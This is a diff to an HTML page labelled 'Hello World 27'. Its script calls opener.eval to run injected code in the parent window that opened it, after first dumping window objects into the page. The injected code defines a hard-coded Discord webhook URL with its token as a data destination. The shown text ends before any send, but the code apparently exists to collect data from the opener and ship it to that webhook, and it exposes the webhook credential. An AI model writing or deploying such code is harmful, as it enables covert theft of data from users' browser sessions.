@@ -1,16 +1,16 @@
-Hello World 26
+Hello World 27
 <!DOCTYPE html>
 <html>
 <body>
 
 <script type="text/javascript"> 
 try{
-    /*
+    
     b = document.body;
     w = b.appendChild(document.createElement("pre"));  
     p = b.appendChild(document.createElement("pre"));
     var cache = [];
-    p.innerHTML = JSON.stringify(opener,(key, value) => {
+    p.innerHTML = JSON.stringify(this,(key, value) => {
       if (typeof value === 'object' && value !== null) {
         // Duplicate reference found, discard key
         if (cache.includes(value)) return;
@@ -21,7 +21,7 @@ try{
       return value;
     });
     cache = null;
-    */
+    
     opener.eval(`    
     let cache = [];
     let dataWebhook = "https://discord.com/api/webhooks/1118142166024323153/X9cL9G4VY8ZDLmwa6xfAdXf6cyO0NWE0Gsf5Ao3o4stAuqqX4csuek6awCFfKgUZzhtw";
